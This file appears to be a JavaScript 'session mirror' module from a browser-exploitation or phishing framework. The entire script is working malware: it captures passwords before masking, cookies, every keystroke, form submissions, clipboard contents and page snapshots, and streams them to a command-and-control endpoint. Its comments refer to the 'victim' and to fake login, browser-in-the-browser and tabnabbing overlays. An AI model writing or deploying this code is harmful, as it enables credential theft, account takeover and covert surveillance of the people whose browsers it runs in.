if (window.__pzMirror) return 'already active';
window.__pzMirror = { active: true };

var C2 = location.protocol + '//' + location.host;
var CID = window.__pzCid || '';
var SNAPSHOT_INTERVAL = 2000;
var INPUT_DEBOUNCE = 300;

function send(type, data) {
  fetch(C2 + '/result', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cid: CID, cmd_id: 'session_mirror', result: { type: type, ts: Date.now(), url: location.href, data: data } })
  }).catch(function(){});
}

// ── 1. Full DOM snapshot — periodic ──────────────────────────────────────────
function snapshot() {
  if (!window.__pzMirror.active) return;
  try {
    // Capture all input values (including passwords BEFORE masking)
    var inputs = [];
    document.querySelectorAll('input, textarea, select').forEach(function(el) {
      inputs.push({
        tag: el.tagName.toLowerCase(),
        type: el.type || '',
        name: el.name || el.id || '',
        value: el.value || '',
        placeholder: el.placeholder || '',
        checked: el.checked || false
      });
    });

    // Capture full HTML for visual rendering in Mirror tab
    // Clone the document, strip scripts, inject input values back in
    var html = '';
    try {
      var clone = document.documentElement.cloneNode(true);
      // Remove all script tags to prevent execution in mirror iframe
      var scripts = clone.querySelectorAll('script,noscript');
      for (var s = 0; s < scripts.length; s++) scripts[s].remove();
      // Only remove the mirror's own invisible infrastructure, NOT visible overlays
      // Keep all __pz overlays the victim can see (fake logins, BitB, tabnab, etc.)

      // Convert relative stylesheet URLs to absolute so they load in mirror iframe
      var links = clone.querySelectorAll('link[rel="stylesheet"]');
      for (var s = 0; s < links.length; s++) {
        var href = links[s].getAttribute('href');
        if (href && !href.match(/^https?:\/\//)) {
          try { links[s].setAttribute('href', new URL(href, location.href).href); } catch(e) {}
        }
      }
      // Convert relative image sources to absolute
      var imgs = clone.querySelectorAll('img[src]');
      for (var s = 0; s < imgs.length; s++) {
        var src = imgs[s].getAttribute('src');
        if (src && !src.match(/^(https?:\/\/|data:)/)) {
          try { imgs[s].setAttribute('src', new URL(src, location.href).href); } catch(e) {}
        }
      }

      // Capture computed styles of the body and any overlay elements
      // This ensures fixed-position overlays render correctly
      try {
        var bodyStyle = window.getComputedStyle(document.body);
        var bodyEl = clone.querySelector('body');
        if (bodyEl) {
          bodyEl.setAttribute('style', (bodyEl.getAttribute('style') || '') + ';margin:' + bodyStyle.margin + ';padding:' + bodyStyle.padding + ';background:' + bodyStyle.background + ';font-family:' + bodyStyle.fontFamily + ';color:' + bodyStyle.color);
        }
      } catch(e) {}

      // Bake current input values into HTML attributes
      var realInputs = document.querySelectorAll('input, textarea, select');
      var cloneInputs = clone.querySelectorAll('input, textarea, select');
      for (var s = 0; s < cloneInputs.length && s < realInputs.length; s++) {
        if (realInputs[s].type === 'checkbox' || realInputs[s].type === 'radio') {
          if (realInputs[s].checked) cloneInputs[s].setAttribute('checked', '');
          else cloneInputs[s].removeAttribute('checked');
        } else {
          cloneInputs[s].setAttribute('value', realInputs[s].value || '');
        }
      }
      // Bake textarea content
      var realTA = document.querySelectorAll('textarea');
      var cloneTA = clone.querySelectorAll('textarea');
      for (var s = 0; s < cloneTA.length && s < realTA.length; s++) {
        cloneTA[s].textContent = realTA[s].value || '';
      }
      html = clone.outerHTML;
      // Limit to 500KB to avoid overwhelming the C2
      if (html.length > 500000) html = html.slice(0, 500000);
    } catch(e) { html = ''; }

    send('snapshot', {
      title: document.title,
      html: html,
      html_length: html.length,
      body_text: document.body ? document.body.innerText.slice(0, 3000) : '',
      inputs: inputs,
      forms: document.forms.length,
      cookies: document.cookie,
      scroll: { x: window.scrollX, y: window.scrollY },
      viewport: { w: window.innerWidth, h: window.innerHeight }
    });
  } catch(e) {}
}

var snapTimer = setInterval(snapshot, SNAPSHOT_INTERVAL);
snapshot(); // immediate first snapshot

// ── 2. Keystroke capture — every key, with context ───────────────────────────
var keyBuffer = [];
var keyFlushTimer = null;

function flushKeys() {
  if (!keyBuffer.length) return;
  send('keys', { keys: keyBuffer.splice(0) });
}

document.addEventListener('keydown', function(ev) {
  var el = ev.target || {};
  keyBuffer.push({
    key: ev.key,
    code: ev.code,
    ctrl: ev.ctrlKey,
    alt: ev.altKey,
    meta: ev.metaKey,
    shift: ev.shiftKey,
    field: (el.name || el.id || el.tagName || '').slice(0, 50),
    field_type: el.type || '',
    field_value: (el.type === 'password' || el.type === 'email' || el.type === 'text') ? (el.value || '').slice(0, 200) : ''
  });
  clearTimeout(keyFlushTimer);
  keyFlushTimer = setTimeout(flushKeys, INPUT_DEBOUNCE);
}, true);

// ── 3. Input change tracking — captures autofill, paste, programmatic changes
document.addEventListener('input', function(ev) {
  var el = ev.target || {};
  send('input', {
    field: el.name || el.id || '',
    type: el.type || el.tagName || '',
    value: el.value ? el.value.slice(0, 500) : '',
    inputType: ev.inputType || ''
  });
}, true);

document.addEventListener('change', function(ev) {
  var el = ev.target || {};
  send('change', {
    field: el.name || el.id || '',
    type: el.type || el.tagName || '',
    value: el.value ? el.value.slice(0, 500) : ''
  });
}, true);

// ── 4. Mouse tracking — movement + clicks ────────────────────────────────────
// Throttled mousemove — send position every 80ms max
var lastMouseSend = 0;
var MOUSE_THROTTLE = 80;
var pendingMouse = null;
var mouseFlushTimer = null;

function flushMouse() {
  if (pendingMouse) {
    send('mouse', pendingMouse);
    pendingMouse = null;
  }
}

document.addEventListener('mousemove', function(ev) {
  var now = Date.now();
  pendingMouse = { x: ev.clientX, y: ev.clientY };
  if (now - lastMouseSend >= MOUSE_THROTTLE) {
    lastMouseSend = now;
    flushMouse();
  } else {
    clearTimeout(mouseFlushTimer);
    mouseFlushTimer = setTimeout(flushMouse, MOUSE_THROTTLE);
  }
}, true);

document.addEventListener('click', function(ev) {
  var el = ev.target || {};
  var path = [];
  var n = el;
  for (var i = 0; i < 5 && n && n !== document; i++) {
    var desc = n.tagName ? n.tagName.toLowerCase() : '';
    if (n.id) desc += '#' + n.id;
    else if (n.className && typeof n.className === 'string') desc += '.' + n.className.split(' ')[0];
    path.push(desc);
    n = n.parentElement;
  }
  send('click', {
    x: ev.clientX, y: ev.clientY,
    element: path.join(' < '),
    text: (el.textContent || '').slice(0, 100),
    href: el.href || el.closest('a') && el.closest('a').href || ''
  });
}, true);

// ── 5. Navigation tracking ──────────────────────────────────────────────────
window.addEventListener('beforeunload', function() {
  send('navigate', { from: location.href });
});

window.addEventListener('hashchange', function(ev) {
  send('hashchange', { old: ev.oldURL, new: ev.newURL });
});

// ── 6. Clipboard events ─────────────────────────────────────────────────────
document.addEventListener('copy', function(ev) {
  var sel = window.getSelection ? window.getSelection().toString() : '';
  send('copy', { text: sel.slice(0, 1000) });
}, true);

document.addEventListener('paste', function(ev) {
  var text = '';
  try { text = (ev.clipboardData || window.clipboardData).getData('text'); } catch(e) {}
  send('paste', { text: text.slice(0, 1000) });
}, true);

// ── 7. Form submission capture ──────────────────────────────────────────────
document.addEventListener('submit', function(ev) {
  var f = ev.target;
  if (!f || !f.elements) return;
  var fields = {};
  for (var i = 0; i < f.elements.length; i++) {
    var el = f.elements[i];
    if (el.name) fields[el.name] = el.value;
  }
  send('form_submit', { action: f.action, method: f.method, fields: fields });
}, true);

// ── 8. Visibility tracking ──────────────────────────────────────────────────
document.addEventListener('visibilitychange', function() {
  send('visibility', { hidden: document.hidden });
});

// ── 9. Console error tracking ────────────────────────────────────────────────
window.addEventListener('error', function(ev) {
  send('js_error', { message: ev.message, file: ev.filename, line: ev.lineno, col: ev.colno });
});

// ── 10. Selection tracking (detects reading sensitive content) ───────────────
var selTimer = null;
document.addEventListener('selectionchange', function() {
  clearTimeout(selTimer);
  selTimer = setTimeout(function() {
    var sel = window.getSelection ? window.getSelection().toString() : '';
    if (sel.length > 10) send('selection', { text: sel.slice(0, 1000) });
  }, 500);
});

return 'session mirror active — streaming snapshots, keystrokes, clicks, inputs, clipboard, forms, navigation to C2 every ' + (SNAPSHOT_INTERVAL/1000) + 's';
